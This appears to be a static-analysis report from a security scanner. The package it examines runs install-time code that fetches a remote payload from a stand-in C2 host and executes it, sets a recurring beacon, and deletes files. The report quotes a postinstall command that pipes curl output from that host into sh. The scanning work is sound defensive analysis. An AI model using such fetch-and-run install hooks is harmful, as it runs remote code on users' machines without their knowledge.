# Forge analysis report

- Engine: `forge-analysis 0.0.1`
- Schema: 2
- Mode: static only (no code was run)
- Scope: quick (only files that run by themselves; everything else is counted as not examined)
- Snapshot: `21640997110fe94a814caf659f927b541631e8a6969533c39f962f6461898070`
- Catalog: `661ff253d0997c290715b16d7de935041072e290e1efd30a82fa0c75eed0949b`

<a id="index"></a>

## Index

1. [Overview](#overview) — What was analysed, whether the picture is complete, and one count for everything we could not see.
2. [Entry points](#entry-points) (2) — What runs first: runtime and install entry files, and declared entries that do not match any analysed file.
3. [Execution timeline](#execution-timeline) (5) — When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.
4. [Effects](#effects) (4) — What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.
5. [Data flows](#data-flows) (1) — Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.
6. [Install scripts and shell commands](#install-scripts-and-shell-commands) (2) — Every package.json script, when it runs, and the commands inside it that we could not follow.
7. [Dependencies](#dependencies) (4) — Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.
8. [Unresolved](#unresolved) (3) — Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.
9. [Unlinked imports](#unlinked-imports) (0) — Imports we could not follow to their source: packages, missing files and names that are not exported.
10. [Not analysed](#not-analysed) (5) — Files and folders that were not read as code, by kind, and anything skipped by a limit.
11. [Function index](#function-index) (4) — Every function with its lanes, effects, callers and the facts inside it.

<a id="overview"></a>

## 1. Overview

What was analysed, whether the picture is complete, and one count for everything we could not see.

**Status: incomplete.** Some of the code could not be seen. Each line below says how much, and links to the section that lists every item.

| What we could not see | Count | Listed in |
|---|---|---|
| places where static analysis cannot say what happens | 3 | [Unresolved](#unresolved) |
| imports not followed to their source | 0 | [Unlinked imports](#unlinked-imports) |
| declared entry points that match no analysed file | 0 | [Entry points](#entry-points) |
| files or folders not read as code | 5 | [Not analysed](#not-analysed) |
| dependencies whose own code and install scripts were not analysed | 3 | [Dependencies](#dependencies) |
| calls whose target we could not see (no function followed, no fact) | 3 | [Function index](#function-index) |

- Files analysed: 1
- Files not analysed: 5
- Functions: 4
- Cross-file links made: 0
- Unresolved facts not listed as open because their call was followed to its source: 0
- Facts found: 21
- Facts by kind: 0 entry, 1 import, 5 call, 4 effect, 1 timer, 2 script, 4 dependency, 3 unresolved, 1 flow

[Back to the index](#index)

<a id="entry-points"></a>

## 2. Entry points

What runs first: runtime and install entry files, and declared entries that do not match any analysed file.

Nothing usable was declared, so every file that no other file imports is treated as an entry.

### Runtime entry files (1)

- `setup.js`

### Install entry files (1)

Run when the package is installed.

- `setup.js`

### Declared entries that match no analysed file (0)

None found.

[Back to the index](#index)

<a id="execution-timeline"></a>

## 3. Execution timeline

When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.

### Immediate (3)

Runs right away when the program starts.

- top level of `setup.js`
- anonymous function in `setup.js:3`
- anonymous function in `setup.js:3`

### Recurring (1)

Runs again and again (an interval).

- anonymous function in `setup.js:4`

### Install (3)

Runs when the package is installed, before anything else of it.

- top level of `setup.js`
- anonymous function in `setup.js:3`
- anonymous function in `setup.js:3`

### Timers (1)

- `setup.js:4` in top level of `setup.js` (runs: immediate, install): recurring, 5000 ms, never cleared, `setInterval`

[Back to the index](#index)

<a id="effects"></a>

## 4. Effects

What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.

### Runs code built at run time (1)

- `setup.js:3` in anonymous function in `setup.js:3` (runs: immediate, install)

### Deletes files (1)

- `setup.js:2` in top level of `setup.js` (runs: immediate, install): `/tmp/cache`

### Makes network requests (1)

- `setup.js:3` in top level of `setup.js` (runs: immediate, install): `https://c2.example/payload`

### Writes files (1)

- `setup.js:4` in anonymous function in `setup.js:4` (runs: recurring): `/tmp/beat`

[Back to the index](#index)

<a id="data-flows"></a>

## 5. Data flows

Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.

### Flows (1)

Each line: where the data is used, where it came from, and the expression it came from. "calls it" means the thing being called is network data, so the server decides what runs.

- `setup.js:3` in anonymous function in `setup.js:3` (runs: immediate, install) ← `setup.js:3`: `fetch('https://c2.example/payload')`

[Back to the index](#index)

<a id="install-scripts-and-shell-commands"></a>

## 6. Install scripts and shell commands

Every package.json script, when it runs, and the commands inside it that we could not follow.

### Scripts (2)

- `postinstall` (runs at install) at `package.json:6`: `node setup.js && curl -s https://c2.example/i.sh | sh`
  - not followed: `curl`
  - not followed: `sh`
- `test` (runs only when someone asks) at `package.json:7`: `node test.js`

[Back to the index](#index)

<a id="dependencies"></a>

## 7. Dependencies

Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.

### dependencies (3)

- `evil` `github:someone/evil`: git repository (at `package.json:11`)
- `left-pad` `^1.0.0`: package registry (at `package.json:10`)
- `local` `file:../local`: local path (at `package.json:12`)

### devDependencies (1)

- `tool` `1.2.3`: package registry (at `package.json:15`)

[Back to the index](#index)

<a id="unresolved"></a>

## 8. Unresolved

Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.

### Code built at run time (1)

Text is turned into code and run; what it does cannot be read from the source.

- `setup.js:3` in anonymous function in `setup.js:3` (runs: immediate, install): `t`

### Shell command not followed (2)

A command in a script that is not `node <file>` or `npm run <script>`, or one built at run time.

- `package.json:6`: `curl`
- `package.json:6`: `sh`

[Back to the index](#index)

<a id="unlinked-imports"></a>

## 9. Unlinked imports

Imports we could not follow to their source: packages, missing files and names that are not exported.

None found.

[Back to the index](#index)

<a id="not-analysed"></a>

## 10. Not analysed

Files and folders that were not read as code, by kind, and anything skipped by a limit.

### Package manager settings (1)

`.npmrc` and similar: can change where packages come from and run hooks.

- `.npmrc` (35 bytes)

### Shell and batch scripts (1)

Not read. They can run anything.

- `run.sh` (18 bytes)

### Other files (1)

Not code we analyse (documents, images, data, unknown types). Listed so nothing is hidden.

- `data.json` (9 bytes)

### Not read: outside the quick scan (2)

Code a full run would read. A quick scan reads only the files that run by themselves, and what they load.

- `lib.js` (46 bytes)
- `test.js` (18 bytes)

[Back to the index](#index)

<a id="function-index"></a>

## 11. Function index

Every function with its lanes, effects, callers and the facts inside it.

### Calls we could not trace, by what they call (3)

Nothing in the analysis says what these run. The label is made from names only; `(..)` stands for a computed receiver. Every call is also listed, with its line, under its function below.

- `(..).then` ×2 in 1 function(s) across 1 file(s)
- `r.text` ×1 in 1 function(s) across 1 file(s)

### `setup.js` (4)

- top level at line 1
  - runs: immediate, install
  - can reach: writes files, deletes files, makes network requests, runs code built at run time
  - calls to something other than a function in this file: 6 (0 followed through an import or a prop, 4 matched to a fact, 2 not traced to any code)
  - not traced: `(..).then` at line 3, 3
  - facts: `fact:c84dfdaf5bf34872`, `fact:056fe7f3c71e6b50`, `fact:7f1a8d20d9216e55`, `fact:4cc140adbcc4fc13`, `fact:4b45608f3cf8d81e`, `fact:8e90923ec4d7ab03`, `fact:38c761f4499498f8`
- anonymous at line 3
  - runs: immediate, install
  - calls to something other than a function in this file: 1 (0 followed through an import or a prop, 0 matched to a fact, 1 not traced to any code)
  - not traced: `r.text` at line 3
- anonymous at line 3
  - runs: immediate, install
  - can reach: runs code built at run time
  - unresolved inside: Code built at run time
  - calls to something other than a function in this file: 1 (0 followed through an import or a prop, 1 matched to a fact, 0 not traced to any code)
  - facts: `fact:4fb37decbb748c7f`, `fact:1d5d4970d0d178f7`, `fact:68df2048122e2fe3`, `fact:909a5c4ffb95808e`
- anonymous at line 4
  - runs: recurring
  - can reach: writes files
  - calls to something other than a function in this file: 1 (0 followed through an import or a prop, 1 matched to a fact, 0 not traced to any code)
  - facts: `fact:0becde626b3a9a5a`, `fact:0ab78a27a5c9fe51`

[Back to the index](#index)
